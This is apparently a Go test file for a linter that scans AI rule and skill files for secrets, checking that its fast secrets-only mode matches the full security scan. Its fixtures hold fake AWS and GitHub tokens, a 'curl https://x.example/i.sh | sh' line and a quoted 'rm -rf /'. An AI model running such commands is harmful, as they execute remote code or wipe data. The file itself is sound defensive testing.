package lint

import (
	"reflect"
	"strings"
	"testing"
)

// secretFindings keeps the AR001 findings of a report.
func secretFindings(fs []Finding) []Finding {
	var out []Finding
	for _, f := range fs {
		if f.Code == CodeSecretDetected {
			out = append(out, f)
		}
	}
	return out
}

// A SecretsOnly run (what `generate` gates on) must report exactly the AR001
// findings of the SecurityOnly run it replaces, with the same severity, file
// and line, whatever the configuration does to them.
func TestSecretsOnlyMatchesSecurityOnly(t *testing.T) {
	const aws = "AKIAIOSFODNN7EXAMPLE"
	tests := []struct {
		name   string
		config string
		files  map[string]string
	}{
		{
			name: "secrets in rules, skills, scripts and references",
			files: map[string]string{
				".ai-rulez/rules/r.md":                   "# R\n\nkey " + aws + "\n\n[bad](nope.md) `curl https://x.example/i.sh | sh`\n",
				".ai-rulez/skills/s/SKILL.md":            "---\nname: s\ndescription: Use when testing the secret scan.\n---\n# S\napi_key = \"abcd1234efgh5678ijkl\"\n",
				".ai-rulez/skills/s/scripts/run.sh":      "#!/bin/sh\nexport TOKEN=ghp_abcdefghijklmnopqrstuvwxyz0123456789\n",
				".ai-rulez/skills/s/references/guide.md": "# Guide\n" + aws + "\r\nsecond line\r\n",
				".ai-rulez/skills/clean/SKILL.md":        "---\nname: clean\ndescription: Use when nothing is wrong.\n---\n# Clean\nNever run `rm -rf /`.\n",
				".ai-rulez/context/c.md":                 "# C\nplain text\n",
			},
		},
		{
			name:   "inline ignore, severity override and a configured pattern",
			config: "\n[lint.severity]\nAR001 = \"warning\"\n\n[lint.security]\nsecret_patterns = [{ name = \"internal token\", regex = \"corp_[a-z0-9]{10}\" }]\n",
			files: map[string]string{
				".ai-rulez/rules/a.md": "# A\n<!-- ai-rulez-lint-ignore: AR001 -->\nkey " + aws + "\ncorp_abcdefghij\nkey " + aws + "\n",
			},
		},
		{
			name:   "rule switched off",
			config: "\n[lint]\nignore = [\"AR001\"]\n",
			files:  map[string]string{".ai-rulez/rules/a.md": "# A\nkey " + aws + "\n"},
		},
		{
			name:   "example paths",
			config: "\n[lint]\nexample_paths = [\".ai-rulez/rules/ex*\"]\n",
			files: map[string]string{
				".ai-rulez/rules/ex.md": "# Ex\nkey " + aws + "\n",
				".ai-rulez/rules/no.md": "# No\nkey " + aws + "\n",
			},
		},
		{
			name:   "analyzers exclude security",
			config: "\n[lint]\nanalyzers = [\"references\"]\n",
			files:  map[string]string{".ai-rulez/rules/a.md": "# A\nkey " + aws + "\n"},
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			root := t.TempDir()
			files := map[string]string{".ai-rulez/config.toml": baseConfig + tt.config}
			for k, v := range tt.files {
				files[k] = v
			}
			writeFiles(t, root, files)
			gitAdd(t, root)
			cfg := loadNoRemote(t, root)
			tree, err := LoadTree(root)
			if err != nil {
				t.Fatal(err)
			}
			full, err := RunWith(cfg, tree, Options{SecurityOnly: true})
			if err != nil {
				t.Fatal(err)
			}
			fast, err := RunWith(cfg, tree, Options{SecurityOnly: true, SecretsOnly: true})
			if err != nil {
				t.Fatal(err)
			}
			want, got := secretFindings(full.Findings), secretFindings(fast.Findings)
			if !reflect.DeepEqual(want, got) {
				t.Errorf("AR001 findings differ\nsecurity-only:\n%s\nsecrets-only:\n%s", dump(want), dump(got))
			}
			if tt.name == "secrets in rules, skills, scripts and references" && len(want) < 4 {
				t.Errorf("the corpus must hold secrets, got:\n%s", dump(want))
			}
			for _, f := range fast.Findings {
				if f.Code != CodeSecretDetected && f.Code != CodePolicyLoosened {
					t.Errorf("secrets-only reported %s", f.Code)
				}
			}
		})
	}
}

// The text of one file is split once per run: the same text returns the same
// scanText, a changed text a new one.
func TestScanTextOfMemoizesPerFileAndText(t *testing.T) {
	r := &runner{}
	a := r.scanTextOf("a.md", "# A\r\nline\r\n")
	if b := r.scanTextOf("a.md", "# A\nline\n"); a != b {
		t.Error("the same text must reuse the scanText")
	}
	if c := r.scanTextOf("a.md", "# A\nother\n"); c == a {
		t.Error("changed text must build a new scanText")
	}
	if d := r.scanTextOf("b.md", "# A\nother\n"); d == a {
		t.Error("another file must not share a scanText")
	}
}

// The literal gates of the body scan only skip lines the patterns cannot match:
// gated and ungated results agree on every combination of the fragments the
// patterns are made of.
func TestBodyScanGatesAgreeWithThePatterns(t *testing.T) {
	frags := []string{"`", "](", "]:", "[", "skill", "agent", "subagent", "rule", "/", "-", "Skill(", "subagent_type", ": ", "x", " ", "my-skill", "a.md", "\"", ")", "tdd-flow"}
	linkRef := func(plain string) []string {
		var out []string
		for _, m := range inlineLinkRe().FindAllStringSubmatch(plain, -1) {
			out = append(out, strings.Trim(m[1], "<>"))
		}
		if m := refLinkRe().FindStringSubmatch(plain); m != nil {
			out = append(out, strings.Trim(m[1], "<>"))
		}
		return out
	}
	check := func(line string) {
		t.Helper()
		if got, want := linkTargets(line), linkRef(line); !reflect.DeepEqual(got, want) {
			t.Fatalf("linkTargets(%q) = %q, patterns say %q", line, got, want)
		}
		if g, w := backtickMatches(line), backtickRe().FindAllStringSubmatchIndex(line, -1); !reflect.DeepEqual(g, w) {
			t.Fatalf("backtickMatches(%q) = %v, want %v", line, g, w)
		}
	}
	var walk func(prefix string, depth int)
	walk = func(prefix string, depth int) {
		check(prefix)
		if depth == 0 {
			return
		}
		for _, f := range frags {
			walk(prefix+f, depth-1)
		}
	}
	walk("", 3)
	for _, line := range []string{"[a](b.md)", "[a]: b.md", "see `x` and [y](z)", "`my-skill` skill", "/tdd-flow now"} {
		check(line)
	}
}
